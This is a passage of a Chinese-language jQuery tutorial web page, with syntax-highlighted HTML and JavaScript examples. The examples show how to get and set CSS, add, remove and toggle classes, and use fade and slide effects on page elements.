punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#div02 li:first'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                        <span class="token string">'background-color'</span><span class="token punctuation">:</span> <span class="token string">'gold'</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token class">.myClass1</span> </span><span class="token punctuation">{</span>            <span class="token property">color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div01<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        This is div01    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myClass1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        The text color is black.    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div02<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="jQuery-获取并设置css类"><a href="#jQuery-获取并设置css类" class="headerlink" title="jQuery 获取并设置css类"></a><code>jQuery</code> 获取并设置<code>css</code>类</h2><h3 id="1-获取并设置"><a href="#1-获取并设置" class="headerlink" title="1.获取并设置"></a>1.获取并设置</h3><blockquote><p><code>jQuery</code>拥有若干操作<code>css</code> 属性的方法.</p><ul><li><code>.css()</code>设置或返回属性样式</li><li><code>.addClass()</code> :向被选元素添加一个或多个类</li><li><code>.removeClass()</code>:从被选元素删除一个或多个类.</li><li><code>.toggleClass()</code>:对被选元素进行添加/删除类的切换操作</li></ul></blockquote><h3 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h3><blockquote><p>获取设置样式</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 获取样式</span>            <span class="token keyword">var</span> oldStyle <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'color'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old'</span><span class="token punctuation">,</span> oldStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置样式</span>            <span class="token keyword">var</span> newStyle <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'new'</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'color'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 获取样式</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-color'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token class">.myClass</span> </span><span class="token punctuation">{</span>            <span class="token property">color</span><span class="token punctuation">:</span> burlywood<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> coral<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myClass<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        This is a div.    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加新的<code>css</code>类</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">    <script>        $(function() {            // 获取样式            var oldStyle = $('.myClass').css('color');            console.log('old', oldStyle);            // 设置样式            var newStyle = $('.myClass').css({                'color': 'red'            });            console.log('new', $('.myClass').css('color'));            // 获取样式            console.log($('.myClass').css('background-color'));            //添加新的类            $('.myClass').addClass('newClass');            console.log($('.myClass').css('font-size'));            // 移除一个类            $('.myClass').removeClass('newClass');            console.log($('.myClass').css('font-size'));        })    </script><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>切换类,需要绑定点击事件</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 获取样式</span>            <span class="token keyword">var</span> oldStyle <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'color'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old'</span><span class="token punctuation">,</span> oldStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置样式</span>            <span class="token keyword">var</span> newStyle <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'new'</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'color'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 获取样式</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-color'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//添加新的类</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">'newClass'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'font-size'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 移除一个类</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">'newClass'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'font-size'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 切换类</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toggleClass</span><span class="token punctuation">(</span><span class="token string">'changeClass'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token class">.myClass</span> </span><span class="token punctuation">{</span>            <span class="token property">color</span><span class="token punctuation">:</span> burlywood<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> coral<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.newClass</span> </span><span class="token punctuation">{</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.changeClass</span> </span><span class="token punctuation">{</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> cornflowerblue<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myClass<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        This is a div.    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>btn<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>change<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="jQuery效果"><a href="#jQuery效果" class="headerlink" title="jQuery效果"></a>jQuery效果</h2><h3 id="1-特殊效果"><a href="#1-特殊效果" class="headerlink" title="1.特殊效果"></a>1.特殊效果</h3><blockquote><table><thead><tr><th><code>fadeout()</code></th><th>淡出</th></tr></thead><tbody><tr><td><code>fadein()</code></td><td>淡入</td></tr><tr><td><code>fadeToggle()</code></td><td>切换淡入淡出</td></tr><tr><td><code>hide()</code></td><td>隐藏元素</td></tr><tr><td><code>show()</code></td><td>显示元素</td></tr><tr><td><code>toggle()</code></td><td>隐藏和显示元素</td></tr><tr><td><code>slideDown()</code></td><td>向下展开</td></tr><tr><td><code>slideUp()</code></td><td>向上卷起</td></tr><tr><td><code>slideToggle()</code></td><td>依次展开或卷起某个元素</td></tr></tbody></table><p>以上使用类似如下:</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$('p').fadeToggle([speed,[easing],[fn]] )// speed: 可以指定时间,单位是毫秒,也可以指定 slow, mormal, fast// easing: 切换效果,默认是 swing// fn 在动画完成时执行的函数,每个元素执行一次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#list'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">// 淡入淡出</span>          <span class="token comment" spellcheck="true">// $(this).siblings('li').slideToggle('slow');</span>          <span class="token comment" spellcheck="true">// 依次展开卷起</span>          <span class="token comment" spellcheck="true">// $(this).siblings('li').slideToggle();</span>          <span class="token comment" spellcheck="true">// 隐藏显示</span>          <span class="token comment" spellcheck="true">// $(this).siblings('li').toggle();</span>          <span class="token comment" spellcheck="true">// 触发效果并执行一个函数</span>          <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">siblings</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideToggle</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>              <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                  <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'white'</span>              <span class="token punctuation">}</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">  <span class="token selector"><span class="token class">.myList</span> </span><span class="token punctuation">{</span>      <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">200</span>px<span class="token punctuation">;</span>      <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>      <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid gray<span class="token punctuation">;</span>      <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.myList</span> a </span><span class="token punctuation">{</span>      <span class="token property">background-color</span><span class="token punctuation">:</span> greenyellow<span class="token punctuation">;</span>      <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>      <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.myList</span> li </span><span class="token punctuation">{</span>      <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">173</span>px<span class="token punctuation">;</span>      <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">5</span>px<span class="token punctuation">;</span>      <span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">25</span>px<span class="token punctuation">;</span>      <span class="token property">background-color</span><span class="token punctuation">:</span> lightblue<span class="token punctuation">;</span>      <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid gray<span class="token punctuation">;</span>  <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myList<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>list<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>水果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>荔枝<span class="token tag"><span class="token tag"><span class="token 